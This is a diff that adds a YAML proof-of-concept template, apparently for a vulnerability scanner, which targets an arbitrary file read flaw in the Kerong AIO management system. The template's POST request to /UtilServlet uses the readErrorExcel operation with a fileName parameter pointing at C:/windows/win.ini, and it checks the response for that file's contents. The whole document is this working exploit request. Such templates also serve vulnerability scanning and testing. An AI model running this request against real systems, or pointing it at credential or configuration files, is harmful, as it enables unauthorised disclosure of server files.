@@ -1,0 +1,17 @@
+id: poc-yaml-kr-AIO-management-system-UtilServlet-file-read
+info:
+  name: 科荣 AIO 管理系统 UtilServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 科荣 AIO 管理系统
+requests:
+- method: POST
+  path: /UtilServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: operation=readErrorExcel&fileName=C:/windows/win.ini
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"[files]"
+    ) && contains(body,"; for 16-bit app support")
+variables: {}
+transport: http
